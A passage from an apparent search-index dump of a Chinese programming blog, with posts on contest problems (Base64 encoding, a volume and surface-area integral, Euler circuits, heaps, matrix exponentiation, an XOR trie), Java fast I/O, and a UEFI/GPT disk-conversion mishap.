s[pos++]=chs(((tmp&amp;m2)&gt;&gt;12)); s[pos++]=chs(((tmp&amp;m3)&gt;&gt;6)); s[pos++]=chs((tmp&amp;m4)); tmp=0; } } if (len%3) { tmp&lt;&lt;=(3-len%3)8; if ((tmp&amp;m1)&gt;0) s[pos++]=chs((tmp&amp;m1)&gt;&gt;18); if ((tmp&amp;m2)&gt;0) s[pos++]=chs(((tmp&amp;m2)&gt;&gt;12)); if ((tmp&amp;m3)&gt;0) s[pos++]=chs(((tmp&amp;m3)&gt;&gt;6)); if ((tmp&amp;m4)&gt;0) s[pos++]=chs((tmp&amp;m4)); } int sum=4-strlen(s)%4; char t=s+strlen(s); if (sum&lt;4) for(int j=1;j&lt;=sum;j++) t++=’=’; t=’\\0’; strcpy(str,s);} int main(){ int T; scanf(&quot;%d&quot;,&amp;T); while(T–) { int k; scanf(&quot;%d%s&quot;,&amp;k,str); for(int i=1;i&lt;=k;i++) solve(str); printf(&quot;%s\\n&quot;,str); } return 0;}[/cpp]","link":"/posts/7da1b4f5/"},{"title":"Cylinder Candy - The 15th Zhejiang University Programming Contest 求积分","text":"原题地址比赛时卡在这种题上，很是要命 Edward the confectioner is making a new batch of chocolate covered candy. Each candy center is shaped as a cylinder with radius r mm and height h mm. The candy center needs to be covered with a uniform coat of chocolate. The uniform coat of chocolate is d mm thick. You are asked to calcualte the volume and the surface of the chocolate covered candy. Input There are multiple test cases. The first line of input contains an integer T(1≤ T≤ 1000) indicating the number of test cases. For each test case: There are three integers r, h, d in one line. (1≤ r, h, d ≤ 100) Output For each case, print the volume and surface area of the candy in one line. The relative error should be less than 10^-8. Sample Input 21 1 11 3 5 Sample Output 32.907950527415 51.1551353380771141.046818749128 532.235830206285 Author: ZHOU, Yuchen Source: The 15th Zhejiang University Programming Contest 在底面半径r mm，高h mm的圆柱体糖块外裹上一层厚度均匀的壳，求它的体积和表面积。设外壳厚度为$latex a $ mm(只是为了避免与微分符号混淆，原题中用d表示)， 求体积 (1)糖果顶上和底下的各一个侧面圆滑的类台体$latex z^2+{(y-r)}^2=a^2(y\\ge r),y=\\sqrt {a^2-z^2} +r.$$$\\begin{array}\\newlineV_{台体}=\\int_0^a{\\pi (\\sqrt {a^2-z^2} +r)^2 {\\rm d}z}\\newline\\left( 或V_{台体}=\\int_0^a {\\rm d}z\\int_0^{2\\pi}{\\rm d}\\theta \\int_0^{r+a\\sqrt{1-\\frac{z^2}{a^2}}}r{\\rm d}r \\right)\\newline=\\int_0^a \\pi \\left(r+a\\sqrt{1-\\frac{z^2}{a^2}}\\right)^2 {\\rm d}z\\newline=\\int_0^a \\left( \\pi r^2+\\pi a^2\\left(1-\\frac{z^2}{a^2}\\right)+2\\pi ar\\sqrt{1-\\frac{z^2}{a^2}} \\right) {\\rm d}z\\newline=\\int_0^a \\left( \\pi r^2+\\pi a^2 \\right) {\\rm d}z-\\int_0^a \\pi z^2{\\rm d}z + \\int_0^a 2\\pi r\\sqrt{a^2-z^2}{\\rm d}z\\newline=\\pi a^3+\\pi ar^2-\\frac{\\pi a^3}{3}+\\frac{\\pi^2 a^2r}{2}\\newline\\end{array}$$ (2)糖果中部的圆柱体$latex V_{圆柱}=Sh=\\pi r^2h=\\pi(r+a)^2h$ (3)总体积$latex V=2V_{台体}+V_{圆柱}=\\frac{4\\pi a^3}{3}+2\\pi ar^2+\\pi^2a^2r+\\pi(r+a)^2h $ 求表面积 (1)求上下各一个环状曲面的面积这个曲面（轮胎面）的参数方程为$$\\begin{cases}x = (r+a {\\rm cos}\\varphi) {\\rm cos}\\theta \\newliney = (r+a {\\rm cos}\\varphi) {\\rm sin}\\theta \\newlinez = a {\\rm sin}\\varphi\\end{cases}$$用向量值函数表示为：$latex \\vec{f}(\\theta,\\varphi)=x(\\theta,\\varphi)\\vec{i}+y(\\theta,\\varphi)\\vec{j}+z(\\theta,\\varphi)\\vec{k}$该曲面上某一点(x,y,z)处的基本法向量$$\\vec{n}=(-\\frac{\\partial z}{\\partial x},-\\frac{\\partial z}{\\partial y},1)=\\frac{\\partial \\vec{f}}{\\partial \\theta}\\times\\frac{\\partial \\vec{f}}{\\partial \\varphi}$$积分区域$latex \\Sigma=$ { $latex \\left(\\theta,\\varphi \\right) | 0\\le \\theta \\le 2\\pi,0\\le \\varphi \\le\\frac{\\pi}{2} $ }$$\\begin{array}\\newlineS_{环}=\\iint_\\Sigma {\\rm d}S=\\iint_\\Sigma |\\vec{n}| {\\rm d}x{\\rm d}y\\newline=\\iint_\\Sigma \\sqrt{\\left(-\\frac{\\partial z}{\\partial x}\\right)^2+\\left(-\\frac{\\partial z}{\\partial y}\\right)^2+1}{\\rm d}x{\\rm d}y\\newline=\\iint_\\Sigma \\left|\\frac{\\partial \\vec{f}}{\\partial \\theta}\\times\\frac{\\partial \\vec{f}}{\\partial \\varphi}\\right| {\\rm d}x{\\rm d}y\\newline=\\int_0^\\frac{\\pi}{2} {\\rm d}\\varphi \\int_0^{2\\pi} a(r+a {\\rm cos}\\varphi) {\\rm d}\\theta\\newline=\\int_0^\\frac{\\pi}{2} 2\\pi a(r+a {\\rm cos}\\varphi){\\rm d}\\varphi\\newline=2\\pi a\\left.(r+a {\\rm cos}\\varphi)\\right|_0^\\frac{\\pi}{2}=\\pi^2 ar+2\\pi a^2\\newline\\end{array}$$ (2)求侧面积$$S_{侧}=2 \\pi(r+a)h$$ (3)求底面积$$S_{底}=\\pi r^2$$ (4)总表面积$$S=S_{环}+S_{侧}+2S_{底}=\\pi^2 ar+2\\pi a^2+2 \\pi(r+a)h+2 \\pi r^2$$","link":"/posts/d112214c/"},{"title":"Java 输入输出效率优化黑科技get","text":"刚开始，用最常规的输入输出： import java.util.*; Scanner scan=new Scanner(System.in); System.out.println(\"...\"); 面对海量输入输出数据，TLE妥妥的 接着有了下面这种姿势（输入流？）： import java.util.*; import java.io.*; Scanner scan=new Scanner(new BufferedInputStream(System.in)); 效果不太理想。最后查阅大神用于处理水题的代码，获得以下终极模板： import java.io.*; /*...*/ public static void main(String[] args) throws IOException { StreamTokenizer in = new StreamTokenizer(new BufferedReader(new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); while(in.nextToken() != StreamTokenizer.TT_EOF){ n=(long)in.nval; in.nextToken(); m=(long)in.nval; out.println(n+\" \"+m); } out.flush();//刷新。若本行放循环体内，则毎输入一组数据即输出一组答案，但是效率降低 out.close(); }","link":"/posts/47eab411/"},{"title":"【转】Mac OS X 入门级命令，很实用性的","text":"原文地址","link":"/posts/786b4f6e/"},{"title":"6月底7月初兴风作浪折腾UEFI+GPT+Clover+Mac","text":"太久没更新博客了，原因之一是此番折腾的曲折历程！ Stage 1在硬盘前部空余空间（上次折腾后的预留空间）建立了200MB的fat32分区，并用bcdboot命令写入了win7引导文件，炮制了一个有“水分”的EFI分区。主板早已启用UEFI，自然重启操作系统成功。接着心一急，手一横，没切换到PE系统就动用DG专业版转换分区表格式。结果出乎意料，却合情合理，win 7直接蓝屏。心急火燎地喊来PE，把分区表格式从GPT转回MBR，可是DG不配合工作，在即将转成时报错终止。直到此时，看似MBR，实则硬盘分区表出了隐性故障。win7启动卡在飘动的徽标处，再也进不去了。 Stage 2三番五次倒腾分区与分区表，多次取用先前的C盘的ghost备份镜像，没有实际作用。 Stage 3经百度经验查实，win7及其安装光盘所带的diskpart能够安全实现MBR与GPT互转。可是代价是丢失所有分区。赶紧备份所有必要资料，把win7安装镜像搬到U盘。较为耗时的流程。这下分区表重建了，而后手动建立了各个所需的分区方休。还通过电话激活解决了不少工具束手无策的额外的win7 UEFI激活问题。","link":"/posts/acbcb778/"},{"title":"改良Eclipse Java EE IDE，使它的界面更顺眼、更酷炫","text":"当前使用的版本是 Luna Service Release 2 (4.4.2) 从所给的【链接】 下载Dark Juno主题，它修改了Eclipse所有的视图的颜色，工具栏也变成了暗黑主题。另外还需要修改编辑器的颜色主题。下载Eclipse的颜色主题(Color Themes)插件，可通过Eclipse的Marketplace找到Eclipse Color Theme插件。 主题包下载完成后，请解压到Eclipse安装目录的dropins子目录下。重启Eclipse，并选择菜单”Preferences”-&gt;”General”-&gt;”Appearance”，并选择Dark Juno主题。代码高亮的颜色主题在它的下级选项Color Theme中选择。体验到如VS一般的酷黑风格了吧？ =================================================其实本该是这个样子的，可是总有什么不一样的地方？http://blog.csdn.net/chszs/article/details/8301884 ===========2015-07补充============================进入Settings-&gt;General-&gt;Keys，修改Context Assist项目，可提供代码补全的快捷键支持。","link":"/posts/8d5f3ac5/"},{"title":"【150707】Blog主题更换 - Amativeness(改) → Clearision","text":"感谢不知名的作者提供的Amativeness主题，附带了华丽的特效，更给我一个精美的CSS调试用样例。可是面对多样化的文章、页面类型，背景有待完善。WP-Touch插件未能及时更新，失去了移动端的前台支持。所以下定决心，寻找自适应的主题，迎来了本blog第一次真正的主题更替。钉子菊苣设计的Clearision主题就是这样的出彩而不浮华。向着网页前台的无限设计机遇的原始森林探险。","link":"/posts/3de4cf29/"},{"title":"暑期的Github是不是应该活跃起来了？","text":"暑期的Github是不是应该活跃起来了？来个“commit中断就请饮料”的活动？","link":"/posts/d1ea1cb0/"},{"title":"（迟到的）湖南湘潭程序设计邀请赛后感想","text":"来到如此遥远的地域挑战未知，少有惊喜却多有险阻。第一个签到题D题的疏忽几乎引起我的疯狂WA。实际上只是简单的边界问题的处理（分数值等于0）胡牛和张学长的仔细列举检验奏效了。我个人花大量精力为F题写的线段树惨烈地挂了。Lazy标记未能体现出应有的使用价值。多种不同的修改操作与统计操作的优先级，必是平时练习时漏洞密布之处。E题简单的计算几何遭遇了一些磕绊。张学长所归纳的方程是正确的，只是计算过程中变量范围的设置不甚合理。相比之下，A题递推的实现较为顺利。I题和J题是既面熟又陌生的题型。尽管全队坚持到了最后一刻，却未能再争取关键的突破。赛后听解题报告会，发现原题无不存在破解的可能性？","link":"/posts/9e7078be/"},{"title":"Java io StreamTokenizer的使用小结","text":"StreamTokenizerdouble navl ——&gt; 如果当前标记是一个数字，则此字段将包含该数字的值。String sval ——&gt; 如果当前标记是一个文字标记，则此字段包含一个给出该文字标记的字符的字符串。static int TT_EOF ——&gt;指示已读到流末尾的常量。static int TT_EOL ——-&gt;指示已读到行末尾的常量。static int TT_NUMBER——-&gt;指示已读到一个数字标记的常量。static int TT_WORD ——-&gt; 指示已读到一个文字标记的常量。int ttype ——–&gt; 在调用 nextToken() 方法之后，此字段将包含刚读取的标记的类型。The StreamTokenizer class takes an input stream and parses it into “tokens”, allowing the tokens to be read one at a time，这些符号的拆分是按照空格来确定的。 查阅官方文档得知，它是不把数字作为字符处理的。它能取得的字符串是以大小写字母为内容的。换行符也会被视作空格。","link":"/posts/be955028/"},{"title":"hdu 2894 DFS 欧拉回路","text":"这应该是《离散数学》教材中关于欧拉回路的一道例题，模型很经典。不要拘泥于过去邻接矩阵存储形式的做法！从效率角度上着想，能得到更佳的解决方案 [code lang=”cpp”]struct Edge{ int to,next,ve; Edge(){} Edge(int v,int w,int x):to(v),next(w),ve(x){}} edge[maxn];int head[maxn],cnt; void addedge(int u,int v){ if (u==v) return; edge[cnt]=Edge(v,head[u],v); head[u]=cnt++; /*edge[head[0]]=Edge(u,head[v]); head[v]=head[0]++;*/ } bool vis[maxn];int n,N;vector&lt;int&gt; vec; void init(){ memset(head,-1,sizeof(head)); cnt=0; for(int i=0;i&amp;lt;N;i++) { //cout&amp;lt;&amp;lt;i&amp;lt;&amp;lt;&apos;:&apos;&amp;lt;&amp;lt;(i&amp;lt;&amp;lt;1)%N&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;((i&amp;lt;&amp;lt;1)|1)%N&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;((N|i)&amp;gt;&amp;gt;1)&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;(i&amp;gt;&amp;gt;1)&amp;lt;&amp;lt;endl; /*mp[i][(i&amp;lt;&amp;lt;1)%N]++; mp[i][((i&amp;lt;&amp;lt;1)|1)%N]++; mp[i][(N|i)&amp;gt;&amp;gt;1]++; mp[i][i&amp;gt;&amp;gt;1]++; mp[i][i]=0;*/ addedge(i+1,(i&amp;lt;&amp;lt;1)%N+1); addedge(i+1,((i&amp;lt;&amp;lt;1)|1)%N+1); //addedge(i,(N|i)&amp;gt;&amp;gt;1); //addedge(i,i&amp;gt;&amp;gt;1); } } void dfs(int u){ for(int i=head[u];i&amp;gt;-1;i=edge[i].next) { int v=edge[i].to; //cout&amp;lt;&amp;lt;u&amp;lt;&amp;lt;&apos; &apos;&amp;lt;&amp;lt;v&amp;lt;&amp;lt;endl; if (vis[edge[i].ve]) continue; vis[edge[i].ve]=1; vec.push_back(edge[i].ve); dfs(v); } } int main(){ while(~scanf(&quot;%d&quot;,&amp;n)) { N=1&lt;&lt;n; init(); vec.clear(); CLEAR(vis,maxn); dfs(1); cout&amp;lt;&amp;lt;N&amp;lt;&amp;lt;&apos; &apos;; //cout&amp;lt;&amp;lt;vec[0]; for(int i=0;i&amp;lt;vec.size();i++) cout&amp;lt;&amp;lt;(vec[i]&amp;amp;1);//cout&amp;lt;&amp;lt;vec[i]&amp;lt;&amp;lt;&apos; &apos;; cout&amp;lt;&amp;lt;endl; } return 0; }[/code]","link":"/posts/c87abe34/"},{"title":"2015 ACM-ICPC 上海邀请赛 迭代解决","text":"B.Base64 Problem DescriptionMike does not want others to view his messages, so he find a encode method Base64.Here is an example of the note in Chinese Passport.The Ministry of Foreign Affairs of the People’s Republic of China requests all civil and military authorities of foreign countries to allow the bearer of this passport to pass freely and afford assistance in case of need. When encoded by $latex \\texttt{Base64} $, it looks as follows VGhlIE1pbmlzdHJ5IG9mIEZvcmVpZ24gQWZmYWlycyBvZiB0aGUgUGVvcGxlJ3MgUmVwdWJsaWMgb2YgQ2hpbmEgcmVxdWVzdHMgYWxsIGNpdmlsIGFuZCBtaWxpdGFyeSBhdXRob3JpdGllcyBvZiBmb3JlaWduIGNvdW50cmllcyB0byBhbGxvdyB0aGUgYmVhcmVyIG9mIHRoaXMgcGFzc3BvcnQgdG8gcGFzcyBmcmVlbHkgYW5kIGFmZm9yZCBhc3Npc3RhbmNlIGluIGNhc2Ugb2YgbmVlZC4= In the above text, the encoded result of $latex \\texttt{The} $ is $latex \\texttt{VGhl} $. Encoded in ASCII, the characters $latex \\texttt{T} $, $latex \\texttt{h} $, and $latex \\texttt{e} $ are stored as the bytes $latex 84$, $latex 104$, and $latex 101$, which are the $latex 8$-bit binary values $latex 01010100$, $latex 01101000$, and $latex 01100101$. These three values are joined together into a 24-bit string, producing $latex 010101000110100001100101$.Groups of $latex 6$ bits ($latex 6$ bits have a maximum of $latex 2^6 = 64$ different binary values) are converted into individual numbers from left to right (in this case, there are four numbers in a 24-bit string), which are then converted into their corresponding Base64 encoded characters.The Base64 index table is 0123456789012345678901234567890123456789012345678901234567890123 ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ In the above example, the string $latex 010101000110100001100101$ is divided into four parts $latex 010101$, $latex 000110$, $latex 100001$ and $latex 100101$, and converted into integers $latex 21, 6, 33$ and $latex 37$. Then we find them in the table, and get V, G, h, l.When the number of bytes to encode is not divisible by three (that is, if there are only one or two bytes of input for the last 24-bit block), then the following action is performed:Add extra bytes with value zero so there are three bytes, and perform the conversion to base64. If there was only one significant input byte, only the first two base64 digits are picked (12 bits), and if there were two significant input bytes, the first three base64 digits are picked (18 bits). ‘=’ characters are added to make the last block contain four base64 characters.As a result, when the last group contains one bytes, the four least significant bits of the final 6-bit block are set to zero; and when the last group contains two bytes, the two least significant bits of the final 6-bit block are set to zero.For example, base64(A) = QQ==, base64(AA) = QUE=.Now, Mike want you to help him encode a string for $latex k$ times. Can you help him?For example, when we encode A for two times, we will get base64(base64(A)) = UVE9PQ==. InputThe first line contains an integer T(T≤20) denoting the number of test cases.In the following T lines, each line contains a case. In each case, there is a number k(1≤k≤5) and a string s. s only contains characters whose ASCII value are from 33 to 126(all visible characters). The length of s is no larger than 100. OutputFor each test case, output Case #t:, to represent this is t-th case. And then output the encoded string. Sample Input21 Mike4 Mike Sample OutputCase #1: TWlrZQ==Case #2: Vmtaa2MyTnNjRkpRVkRBOQ== 粗暴的模拟题，但是赛场上的做法简直一根筋；修正……[code lang=”java”]/** 2015年7月14日 下午2:56:01 PrjName:hdu5237 @ Semprathlon/import java.io.;import java.util.*; public class Main { final static String code = &amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&amp;quot;; static String encode(String str) { String res = new String(); int ch1 = 0, ch0, pos = 0; for (int i = 0; i &amp;lt; str.length(); i++) { ch0 = ch1; ch1 = str.charAt(i); switch (i % 3) { case 0: pos = ch1 &amp;gt;&amp;gt; 2; res += code.charAt(pos); break; case 1: pos = ((ch0 &amp;amp; 3) &amp;lt;&amp;lt; 4) + ((ch1 &amp;amp; ~3) &amp;gt;&amp;gt; 4); res += code.charAt(pos); break; case 2: pos = ((ch0 &amp;amp; 15) &amp;lt;&amp;lt; 2) + ((ch1 &amp;amp; ~15) &amp;gt;&amp;gt; 6); res += code.charAt(pos); pos = ch1 &amp;amp; 63; res += code.charAt(pos); break; } } if (str.length() % 3 == 2) { ch1 = str.charAt(str.length() - 1); pos = (ch1 &amp;amp; 15) &amp;lt;&amp;lt; 2; res += code.charAt(pos); res += &apos;=&apos;; } else if (str.length() % 3 == 1) { ch1 = str.charAt(str.length() - 1); pos = (ch1 &amp;amp; 3) &amp;lt;&amp;lt; 4; res += code.charAt(pos); res += &amp;quot;==&amp;quot;; } return res; } public static void main(String[] args) throws IOException { InputReader in = new InputReader(System.in); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); int T = in.nextInt(), cas = 0; while (T-- &amp;gt; 0) { int k = in.nextInt(); String s = new String(in.next()); for (int i = 1; i &amp;lt;= k; i++) s = encode(s); out.println(&amp;quot;Case #&amp;quot; + (++cas) + &amp;quot;: &amp;quot; + s); } out.flush(); out.close(); } }[/code] #D.Doom本题的唯一（赛场上难以发现的）突破口就是，输入数据任给的正整数，经过不超过30次“平方再取模”操作后都成为某一定值。也有特别的卡long long边界而不卡unsigned long long的现象，Java中不存在无符号类型因而无法实现。 #E.Exam贪心。。。[code lang=”java”]/** Sep 6, 2015 8:40:50 PM PrjName:hdu5240 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/static ArrayList&lt;Data&gt; vec=new ArrayList&lt;Data&gt;();public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T–&gt;0){int n=in.nextInt(); int s=0,last=0; boolean ans=true; vec.clear(); for(int i=1;i&amp;lt;=n;i++){ int r=in.nextInt(); int e=in.nextInt(); int l=in.nextInt(); vec.add(new Data(r, e, l)); } vec.sort(new DataComp()); for(int i=0;i&amp;lt;vec.size();i++){ int r=vec.get(i).r; int e=vec.get(i).e; int l=vec.get(i).l; //out.println(r+&amp;quot; &amp;quot;+e+&amp;quot; &amp;quot;+l); s+=r; if (s&amp;gt;e){ ans=false;break; } s+=l; } out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+(ans?&amp;quot;YES&amp;quot;:&amp;quot;NO&amp;quot;)); } out.flush(); out.close();}}class Data{int r,e,l;Data(int _r,int _e,int _l){ r=_r; e=_e; l=_l;}}class DataComp implements Comparator&lt;Data&gt;{@Overridepublic int compare(Data d1,Data d2){ return Integer.compare(d1.e, d2.e);}}[/code] #F.Friends必须及时通过必要的暴力模拟来找出这个千呼万唤不出来的规律[code lang=”java”]/** 2015年7月27日 上午11:25:38 PrjName:hdu5241 @ Semprathlon/import java.io.;import java.math.BigInteger;import java.util.*;public class Main { static BigInteger TWO=new BigInteger(&quot;2&quot;); public static void main(String[] args) {InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T--&amp;gt;0){ int n=in.nextInt(); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+TWO.pow(n*5)); } out.flush(); out.close(); } }[/code] #J.Joyful赛场上耗费不少精力的题。。。我无论是赛中还是赛后都没明白一点：对一个矩形区域涂色次数的期望，就是对该区域各点涂色期望之和。写代码时轻视了多个int类型值相乘越界的问题[code lang=”java”]/** Sep 6, 2015 9:26:29 PM PrjName:hdu5245 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args*/static double pow(double n, int m) { double res = 1; while (m &gt; 0) {if ((m &amp;amp; 1) &amp;gt; 0) res = res * n; n = n * n; m &amp;gt;&amp;gt;= 1; } return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T–&gt;0){int m=in.nextInt(); int n=in.nextInt(); int k=in.nextInt(); double ans=0; for(int i=1;i&amp;lt;=m;i++) for(int j=1;j&amp;lt;=n;j++){ double s=0; s+=(double)(i-1)*(i-1)*n*n; s+=(double)(m-i)*(m-i)*n*n; s+=(double)m*m*(j-1)*(j-1); s+=(double)m*m*(n-j)*(n-j); s-=(double)(i-1)*(i-1)*(j-1)*(j-1); s-=(double)(i-1)*(i-1)*(n-j)*(n-j); s-=(double)(m-i)*(m-i)*(j-1)*(j-1); s-=(double)(m-i)*(m-i)*(n-j)*(n-j); ans+=1.0-pow(s/n/n/m/m, k); } out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+Math.round(ans)); } out.flush(); out.close();}}[/code] #A.Article赛中没有耐心读完的题。。。赛后还读错了题意……原来按“保存”键是不存在失败率的，这大大简化了问题模型（即可列出状态转移方程）。[code lang=”java”]/** Sep 7, 2015 6:37:43 PM PrjName:hdu5236 @author Semprathlon/import java.io.;import java.util.*;public class Main { /** @param args/static double[] f;static int n,x;static double solve(int k){ double res=kx; if (n%k&gt;0)//res+=f[n/k]*(k-1)+f[n%k]; res+=f[n/k+1]*(n%k)+f[n/k]*(k-n%k); elseres+=f[n/k]*k; return res;}public static void main(String[] args) throws IOException{ // TODO Auto-generated method stub InputReader in=new InputReader(System.in); PrintWriter out=new PrintWriter(System.out); int T=in.nextInt(),cas=0; while(T–&gt;0){n=in.nextInt(); double p=in.nextDouble(); x=in.nextInt(); f=new double[n+1]; for(int i=1;i&amp;lt;=n;i++) f[i]=(f[i-1]+1)/(1-p); double ans=f[n]+x; for(int i=2;i&amp;lt;=n;i++) ans=Math.min(ans, solve(i)); out.println(&amp;quot;Case #&amp;quot;+(++cas)+&amp;quot;: &amp;quot;+String.format(&amp;quot;%.6f&amp;quot;, ans)); } out.flush(); out.close();}}[/code]","link":"/posts/c78e6cb9/"},{"title":"poj 3253 Fence Repair 最小堆 优先队列 哈夫曼树","text":"DescriptionFarmer John wants to repair a small length of the fence around the pasture. He measures the fence and finds that he needs N (1 ≤ N ≤ 20,000) planks of wood, each having some integer length Li (1 ≤ Li ≤ 50,000) units. He then purchases a single long board just long enough to saw into the N planks (i.e., whose length is the sum of the lengths Li). FJ is ignoring the “kerf”, the extra length lost to sawdust when a sawcut is made; you should ignore it, too.FJ sadly realizes that he doesn’t own a saw with which to cut the wood, so he mosies over to Farmer Don’s Farm with this long board and politely asks if he may borrow a saw.Farmer Don, a closet capitalist, doesn’t lend FJ a saw but instead offers to charge Farmer John for each of the N-1 cuts in the plank. The charge to cut a piece of wood is exactly equal to its length. Cutting a plank of length 21 costs 21 cents.Farmer Don then lets Farmer John decide the order and locations to cut the plank. Help Farmer John determine the minimum amount of money he can spend to create the N planks. FJ knows that he can cut the board in various different orders which will result in different charges since the resulting intermediate planks are of different lengths. InputLine 1: One integer N, the number of planksLines 2..N+1: Each line contains a single integer describing the length of a needed plank OutputLine 1: One integer: the minimum amount of money he must spend to make N-1 cuts Sample Input3858 Sample Output34 HintHe wants to cut a board of length 21 into pieces of lengths 8, 5, and 8.The original board measures 8+5+8=21. The first cut will cost 21, and should be used to cut the board into pieces measuring 13 and 8. The second cut will cost 13, and should be used to cut the 13 into 8 and 5. This would cost 21+13=34. If the 21 was cut into 16 and 5 instead, the second cut would cost 16 for a total of 37 (which is more than 34). 犯过以下错误：误用二分元素删除后未完成堆的调整操作最小堆写成了最大堆long类型的res用了int类型 [code lang=”java”]import java.io.*; class Heap { private final int maxn = 50010; int[] data; int r; Heap() { data = new int[maxn]; r = 0; } public int size() { return r; } void swap(int a, int b) { int tmp = data[a]; data[a] = data[b]; data[b] = tmp; } void up(int p) { if (!(p &amp;gt; 0)) return; int q = p &amp;gt;&amp;gt; 1; if (data[p] &amp;lt; data[q]) { swap(p, q); up(q); } } void down(int p) { int q; if ((p &amp;lt;&amp;lt; 1) &amp;gt;= r) return; else if ((p &amp;lt;&amp;lt; 1) == r - 1) { q = p &amp;lt;&amp;lt; 1; } else { q = (data[p &amp;lt;&amp;lt; 1] &amp;lt; data[p &amp;lt;&amp;lt; 1 | 1] ? p &amp;lt;&amp;lt; 1 : p &amp;lt;&amp;lt; 1 | 1); } if (data[p] &amp;gt; data[q]) { swap(p, q); down(q); } } void push(int n) { data[r++] = n; up(r - 1); } int pop() { int res = data[0]; swap(0, r - 1); r--; down(0); return res; } int top() { return data[0]; } } public class Main { private static long solve(int[] a) { Heap hp = new Heap(); int n = a[0], l1, l2; long res = 0; for (int i = 1; i &lt;= n; i++) hp.push(a[i]); // hp.print(); while (hp.size() &gt; 1) { l1 = hp.pop(); l2 = hp.pop(); res += (long) (l1 + l2); hp.push(l1 + l2); } return res; } public static void main(String[] args) throws IOException { StreamTokenizer in = new StreamTokenizer(new BufferedReader( new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(System.out); while (in.nextToken() != StreamTokenizer.TT_EOF) { int n = (int) in.nval; int[] a = new int[n + 1]; a[0] = n; for (int i = 1; i &amp;lt;= n; i++) { in.nextToken(); a[i] = (int) in.nval; } if (n &amp;gt; 1) out.println(solve(a)); else out.println(a[1]); out.flush(); } out.close(); } }[/code]","link":"/posts/d47ad53a/"},{"title":"hdu 2604 Queuing  递推&#x2F;DP 矩阵快速幂 Trie数辅助","text":"过于傻气的递推公式！状态傻傻分不清楚写矩阵乘法，混淆了左乘与右乘。 引用一个类比字符串模式匹配的trie树的应用： [code lang=”java”]/** 2015年7月14日 下午4:51:05 PrjName:hdu2604 @ Semprathlon/import java.io.; class Matrix { int n, m, mod; int[][] dat; Matrix(int n, int m, int mod) { this.n = n; this.m = m; this.mod = mod; this.dat = new int[n][m]; } Matrix(Matrix mat) { this.n = mat.n; this.m = mat.m; this.mod = mat.mod; this.dat = new int[n][m]; for (int i = 0; i &amp;lt; mat.n; i++) for (int j = 0; j &amp;lt; mat.m; j++) this.dat[i][j] = mat.dat[i][j]; } static Matrix one(Matrix mat) { Matrix res = new Matrix(mat.n, mat.m, mat.mod); for (int i = 0; i &amp;lt; Math.min(mat.n, mat.m); i++) res.dat[i][i] = 1; return res; } Matrix add(Matrix c) { Matrix res = new Matrix(this); for (int i = 0; i &amp;lt; n; i++) for (int j = 0; j &amp;lt; m; j++) { res.dat[i][j] += c.dat[i][j]; res.dat[i][j] %= mod; } return res; } Matrix mul(Matrix c) { Matrix res = new Matrix(this.n, c.m, mod); for (int i = 0; i &amp;lt; this.n; i++) for (int j = 0; j &amp;lt; c.m; j++) for (int k = 0; k &amp;lt; this.m; k++) { res.dat[i][j] += this.dat[i][k] * c.dat[k][j]; res.dat[i][j] %= mod; } return res; } Matrix pow(int m) { Matrix n = new Matrix(this); Matrix res = Matrix.one(n); while (m &amp;gt; 0) { if ((m &amp;amp; 1) &amp;gt; 0) res = res.mul(n); n = n.mul(n); m &amp;gt;&amp;gt;= 1; } return res; } } public class Main { static Matrix mat, p; static void init(int mod) { mat = new Matrix(4, 1, mod); mat.dat = new int[][] { { 9 }, { 6 }, { 4 }, { 2 } }; p = new Matrix(4, 4, mod); p.dat = new int[][] { { 1, 0, 1, 1 }, { 1, 0, 0, 0 }, { 0, 1, 0, 0 }, { 0, 0, 1, 0 } }; } static int solve(int l, int m) { mat = p.pow(l - 4).mul(mat); if (l &amp;gt; 4) return mat.dat[0][0]; else if (l &amp;gt; 0) return mat.dat[4 - l][0]; return 0; } public static void main(String[] args) throws IOException { StreamTokenizer in = new StreamTokenizer(new BufferedReader( new InputStreamReader(System.in))); PrintWriter out = new PrintWriter(new OutputStreamWriter(System.out)); while (in.nextToken() != StreamTokenizer.TT_EOF) { int l = (int) in.nval; in.nextToken(); int m = (int) in.nval; init(m); out.println(solve(l, m) % m); } out.flush(); out.close(); } }[/code]","link":"/posts/b893eacf/"},{"title":"hdu 4825 Xor Sum 位操作 字典树","text":"遇到本题，在对象成员中申请数组空间的话，会不明就里地TLE，而且浪费大量内存。 [code lang=”java”]/** 2015年7月15日 上午11:21:15 PrjName:hdu4825 @ Semprathlon*/ import java.io.*; class Trie { private final int maxd = 33; private long data; private Trie ch0, ch1; void insert(long n) { Trie rt = this; for (int i = maxd - 1; i &amp;gt;= 0; i--) { if ((n &amp;amp; (1L &amp;lt;&amp;lt; i)) == 0L) {// 0 if (rt.ch0 == null) rt.ch0 = new Trie(); rt = rt.ch0; } else {// 1 if (rt.ch1 == null) rt.ch1 = new Trie(); rt = rt.ch1; } if (i == 0) rt.data = n; } } long query(long n) { Trie rt = this; for (int i = maxd - 1; i &amp;gt;= 0; i--) { if ((n &amp;amp; (1L &amp;lt;&amp;lt; i)) &amp;gt; 0L &amp;amp;&amp;amp; rt.ch0 != null || rt.ch1 == null)// 0 rt = rt.ch0; else if (rt.ch1 != null)// 1 rt = rt.ch1; } return 